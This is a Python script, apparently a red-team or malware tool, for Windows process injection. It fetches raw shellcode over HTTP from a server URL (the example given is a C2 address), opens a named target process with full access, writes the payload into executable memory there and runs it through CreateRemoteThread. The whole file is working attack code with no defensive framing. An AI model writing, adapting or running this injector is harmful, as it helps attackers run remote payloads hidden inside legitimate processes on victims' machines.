import ctypes
from ctypes import windll
from ctypes import wintypes
from urllib import request
from time import sleep
import os
import wmi
import argparse
import threading


parser = argparse.ArgumentParser(epilog='run shellcode on the fly ;)')
parser.add_argument('process_name', help='process name to inject ex: (notepad.exe)')
parser.add_argument('-server', required=True,help='[REQUIRED] the http server that hosts the shellcode ex: (http://c2.com/shellcode.raw)')
parser.add_argument('-start-process', action='store_true', help='start the target process before injection if its not already running')

args, unknown = parser.parse_known_args()

process_name = args.process_name

kernel32 = windll.kernel32
# constants
MEM_COMMIT_RESERVE = 0x3000
MEM_COMMIT = 0x3000
MEM_RESERVE = 0x3000
PAGE_READWRITE_EXECUTE = 0x40
PROCESS_ALL_ACCESS = 0x1fffff
EXECUTE_IMMEDIATLY = 0

# Function type redefintions
OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = [wintypes.DWORD,wintypes.BOOL,wintypes.DWORD]
OpenProcess.restype = wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD,wintypes.DWORD]
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, wintypes.LPVOID]
WriteProcessMemory.restype = wintypes.BOOL

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD]
CreateRemoteThread.restype = wintypes.HANDLE

CloseHandle = kernel32.CloseHandle
CloseHandle.argtypes = [wintypes.HANDLE]
CloseHandle.restype = wintypes.BOOL



def get_proc_id():
 processes = wmi.WMI().Win32_Process(name=args.process_name)
 pid = processes[0].ProcessId
 print(f"[*] {args.process_name} process id: {pid}")
 
 return int(pid)


response = request.urlopen(args.server)
shellcode = response.read()


if shellcode:
 print(f'[*] retrieved the shellcode from {args.server}')


if args.start_process:
 def start_process():
  print(f'[*] starting {args.process_name}')
  os.system(args.process_name)
 s = threading.Thread(target=start_process)
 s.start()
 sleep(2)

process_id = get_proc_id()

phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
if phandle:
 print("[*] Opened a Handle to the process")

memory = VirtualAllocEx(phandle, None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE_EXECUTE)
if memory:
 print('[*] Allocated Memory in the process')

c_null = ctypes.c_int(0)
writing = WriteProcessMemory(phandle, memory, shellcode, len(shellcode), ctypes.byref(c_null))
if writing:
 print('[*] Wrote The shellcode to memory')

Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)

if Injection:
 print('[*] Injected the shellcode into the process')
 CloseHandle(phandle)